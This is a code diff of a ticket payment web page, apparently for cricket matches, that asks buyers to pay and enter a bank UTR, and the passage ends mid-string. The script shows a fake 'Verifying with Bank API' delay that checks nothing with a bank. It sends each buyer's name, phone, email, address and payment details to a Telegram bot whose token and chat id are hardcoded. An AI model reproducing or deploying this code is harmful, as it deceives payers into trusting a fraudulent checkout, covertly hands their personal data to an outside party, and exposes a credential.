@@ -136,7 +136,7 @@
         </div>
 
         <div class="steps-box">
-            <div style="margin-bottom: 8px;"><span>Step 1</span> Use the Pay Option below.</div>
+            <div style="margin-bottom: 8px;"><span>Step 1</span> Select Pay Option below.</div>
             <div><span>Step 2</span> Pay the exact amount & copy Bank UTR.</div>
         </div>
         
@@ -268,21 +268,25 @@
             document.body.removeChild(a);
         }
 
-        // --- SECURE VALIDATION LOGIC ---
+        // --- NEW SECURE VALIDATION LOGIC ---
         function checkInputs() {
             const utrVal = document.getElementById('utr').value;
             const amtVal = document.getElementById('paid-amt').value;
             const btn = document.getElementById('pay-btn');
+            
             const utrInput = document.getElementById('utr');
             const amtInput = document.getElementById('paid-amt');
 
+            // Reset errors visually
             document.getElementById('utr-error').style.display = 'none';
             document.getElementById('amt-error').style.display = 'none';
             utrInput.style.borderColor = '#0052FF';
             
+            // Only make amount box blue if user is typing
             if(amtVal.length > 0) amtInput.style.borderColor = '#0052FF';
             else amtInput.style.borderColor = '#e2e8f0';
 
+            // Button is enabled only if BOTH fields have data
             if(utrVal.length > 5 && amtVal.length > 0) {
                 btn.disabled = false;
                 btn.classList.add('active');
@@ -295,23 +299,29 @@
         function submitPayment() {
             const val = document.getElementById('utr').value;
             const enteredAmt = document.getElementById('paid-amt').value;
+            
             const errorMsgUtr = document.getElementById('utr-error');
             const errorMsgAmt = document.getElementById('amt-error');
+            
             const utrInput = document.getElementById('utr');
             const amtInput = document.getElementById('paid-amt');
+            
             const btn = document.getElementById('pay-btn');
             const btnLoader = document.getElementById('btn-loader');
             const btnText = document.getElementById('btn-text');
 
+            // 🔥 1. Check if UTR is Fake
             let isUtrFake = false;
             if(val.length !== 12) isUtrFake = true;
             else if(val.startsWith('0')) isUtrFake = true;
             else if(/^(\d)\1{11}$/.test(val)) isUtrFake = true;
-            else if(val === '123456789012' || val === '098765432109') isUtrFake = true;
+            else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isUtrFake = true;
 
+            // 🔥 2. Check if Amount matches Exactly
             let isAmtFake = false;
             if(enteredAmt != finalPrice) isAmtFake = true;
 
+            // Display Errors
             if(isUtrFake) {
                 errorMsgUtr.style.display = 'flex';
                 utrInput.style.borderColor = '#ef4444';
@@ -321,16 +331,19 @@
                 amtInput.style.borderColor = '#ef4444';
             } 
             else {
+                // ALL GOOD - PROCEED!
                 errorMsgUtr.style.display = 'none';
                 errorMsgAmt.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
 
+                // ⏳ FAKE API DELAY
                 btn.classList.remove('active');
                 btn.classList.add('loading');
                 btnText.innerText = "Verifying with Bank API...";
                 btnLoader.style.display = "block";
 
                 setTimeout(() => {
+                    // --- ✈️ TELEGRAM UTR ALERT ---
                     const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
                     const chatId = "6820660513"; 
                     
@@ -340,11 +353,4 @@
                     const address = localStorage.getItem('customerAddress') || 'N/A';
 
                     const telegramMsg = `💰 *PAYMENT SUBMITTED!* 💰%0A%0A` +
-                                        `🏏 *Match:* ${matchTitle}%0A` +
-                                        `💵 *System Amount:* ₹${finalPrice}%0A` +
-                                        `💸 *Entered Amount:* ₹${enteredAmt}%0A` +
-                                        `👤 *Name:* ${name}%0A` +
-                                        `📞 *Phone:* ${phone}%0A` +
-                                        `📧 *Email:* ${email}%0A` +
-                                        `🏠 *Address:* ${address}%0A%0A` +
-                                        `🏦 *
+                                        `🏏 *Match:* ${matchTitle}%
